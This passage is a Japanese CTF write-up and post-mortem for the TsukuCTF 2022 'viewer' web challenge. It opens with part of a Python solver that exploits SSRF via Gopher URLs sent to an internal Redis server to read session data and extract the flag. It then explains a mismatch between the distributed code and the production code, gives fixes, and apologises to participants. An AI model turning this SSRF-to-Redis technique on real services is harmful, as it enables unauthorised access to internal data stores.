id\n}\nres = requests.post(TARGET_URL, data=form, cookies=cookies)\n\nsession_id_list = re.findall(\"(.+-.+-.+-.+-.+)\\r\", res.text)\n# print(session_id_list)\n\n# check redis value\nfor session_id in session_id_list:\n    form[\"url\"] = \"Gopher://redis:6379/+\" + quote(f\"GETRANGE {session_id} 60 -1\\r\\nQUIT\\r\\n\")\n    cookies[\"__SESSION_ID\"] = session_id\n    res = requests.post(TARGET_URL, data=form, cookies=cookies)\n    if \"CTF22{\" in res.text:\n        print(\"TsukuCTF22{\" + res.text[res.text.find(\"CTF22{\") + len(\"CTF22{\"):res.text.find(\"}\u0026#34;\")] + \"}\")\n        sys.exit(0)\n\n```\n\n上記のソルバを実行すると、以下の Flag が得られる。\n\n```\nTsukuCTF22{ur1_scheme_1s_u5efu1}\n```\n\n## ポストモーテム\n\n### 何が起こったか\n\n前提として、実装コードに不備があったために、問題にアクセスする時に Cookie に格納される `__SESSION_ID` が共有されているという問題がありました。\n\n本来であればこの問題により Flag が取得できないはずです。しかし、配布されたコードと本番環境のコードの Flag を Redis に追加する部分に差異があったために、配布されたコードで構築できる環境によっては Flag が取得できないにも拘らず、本番環境では Flag が取得できるという現象が起きました。\n\n実際に本番中はソルバによって Flag が取得できることのみを確認していたため、この問題に気づけませんでした。\n\n### 技術的詳細\n\nコードを用いて具体的に説明します。\n\nまず、以下が配布されたコードで Flag を Redis に追加する部分のコードです。\n\n```python\n# initialization\nredis = redis.Redis(host='redis', port=6379, db=0)\nflag = \"TsukuCTF22{dummy flag}\" # the flag is replaced a real flag in a production environment.\nid = str(uuid.uuid4())\nredis.set(id, json.dumps({\"id\": id, \"name\": flag}))\n```\n\nこれにより、UUIDv4 を ID とした Flag を含むデータが Redis に登録されます。\n\nしかし、アカウント登録の部分にて以下の通りその ID に対して上書きが行われます。\n\n```python\n    redis.set(id, json.dumps({\"id\": str(uuid.uuid4()), \"name\": name}))\n    redis.expire(id, 100)\n```\n\nその結果、Redis に登録された Flag が名前で上書きされてしまいます。\n\n詳しくは[mopi さんのブログ](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)にて検証されているためご覧ください。検証までブログに掲載してくださった mopi さん、ありがとうございました :pray:\n\n***\n\n一方、以下が本番環境のコードで Flag を Redis に追加する部分のコードです。\n\n```python\n# user session information\nredis = redis.Redis(host='redis', port=6379, db=0)\nusers = ['frt', 'ny_a', 'satoki', 'shio', 'taisyo', 'task', \"TsukuCTF22{ur1_scheme_1s_u5efu1}\", 'toto', 'xryuseix', 'y-chan', 'yu1k', 'yoshimi', 'ling', 'momoka', 'taru', 'imino']\nfor user in users:\n    id = str(uuid.uuid4())\n    redis.set(id, json.dumps({\"id\": id, \"name\": user}))\n```\n\n`id` はループでイテレートされているため、`id`が変更されるのは最後のユーザのみになります。そのため、本番環境では Flag の上書きが発生しませんでした。\n\n### 根本原因\n\n**根本原因はユーザ登録を行う id 用の UUIDv4 を再生成していなかったこと** にあります。その影響で、配布されたコードで構築される環境では、Redis に追加された Flag が上書きされてしまい取得することが不可能になります。\n\nしかし、上記の通り、**本番環境では Redis にダミーデータを含めて Flag を挿入していたために、Flag が上書きされずに取得できていました**。この差異は作問時から含まれていましたが、作問時には作問方針と解法の流れのみがレビューされていたために、この問題に気づけませんでした。\n\nまた、本番中は約 1 時間ごとに 1 回ソルバを回して Flag が得られることのみを確認していたために、配布ファイルには気を配れていませんでした。\n\n### 解決\n\n以下の通り `id` を生成してから登録することで、正しい実装になります。\n\n```python\n    id = uuid.uuid4()\n    redis.set(id, json.dumps({\"id\": str(id), \"name\": name}))\n    redis.expire(id, 100)\n```\n\n### 影響\n\n影響を受けたユーザは全ユーザです。一応、本件に関して言及してくださったブログやツイートを載せておきます。\n\n* [TsukuCTF 2022 Writeup](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)\n* [ツイート 1](https://twitter.com/zeosutt/status/1584214650853683200)\n* [ツイート 2](https://twitter.com/shinobe179/status/1584574685718585344)\n\n### 対応者\n\n問題が発覚したのは CTF 終了後だったため、本番中の対応者はいません。\n\n### 追記\n\n実装に関して、他にも修正すべき点がいくつかあったので以下に記載しておきます。\n\n**Exception が起きた時に PycURL のコネクションが close されない**\n\n配布ファイルは以下のようになっており、PycURL で `c.perform()` 実行時に Exception が発生した場合は `c.close()` が呼ばれません。\n\n```python\n        buf = BytesIO()\n        try:\n            c = pycurl.Curl()\n            c.setopt(c.URL, url)\n            c.setopt(c.WRITEDATA, buf)\n            c.perform()\n            c.close()\n\n            body = buf.getvalue().decode('utf-8')\n        except Exception as e:\n            traceback.print_exc()\n            abort(\"error occurs\")\n```\n\nしたがって、以下の通り `finally` 句を利用するべきです。\n\n```python\n        buf = BytesIO()\n        c = None\n        try:\n            c = pycurl.Curl()\n            c.setopt(c.URL, url)\n            c.setopt(c.WRITEDATA, buf)\n            c.perform()\n\n            body = buf.getvalue().decode('utf-8')\n        except Exception as e:\n            traceback.print_exc()\n            abort(\"error occurs\")\n        finally:\n            c.close()\n```\n\n**PycURL のタイムアウトが設けられていない**\n\nPycURL はデフォルトで 300\\[s]のコネクションタイムアウトを持っていますが、今回のアプリケーションの要件には長すぎです。今回の問題では得られた Redis の key に対して全探索を行う必要があり、コネクションが集中することは容易に想定できるため、タイムアウトは 10\\[s]くらいに設定しておいても良かったのではないかと思いました。\n\n### おわりに\n\nこの度は、作問者の実装不備によって、参加者体験を悪くしてしまったことを深くお詫び申し上げます。\n今後はレビュー時に解法の方針やフラグチェック用のソルバだけでなく、配布ファイルにも気を配ってレビューする予定です。\n\nまた、他の参加者も含めたより良い CTF 体験のために、Discord での#ask-to-admin にてお問い合わせいただくなどのご協力をお願いいたします。\n\n## 参考資料\n\n* [ポストモーテムテンプレート - PagerDuty](https://ueokande.github.io/incident-response-docs-ja/after/post_mortem_template/)\n","title":"viewer","description":"Writeups for TsukuCTF21 have been published. Check them out if you'd like!","author":"task4233","genre":"Web","solver":8,"point":500}},"__N_SSG":true},"page":"/ctf/TsukuCTF2022/[id]","query":{"id":"viewer"},"buildId":"uINUjeO87z5y6TQHO95US","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>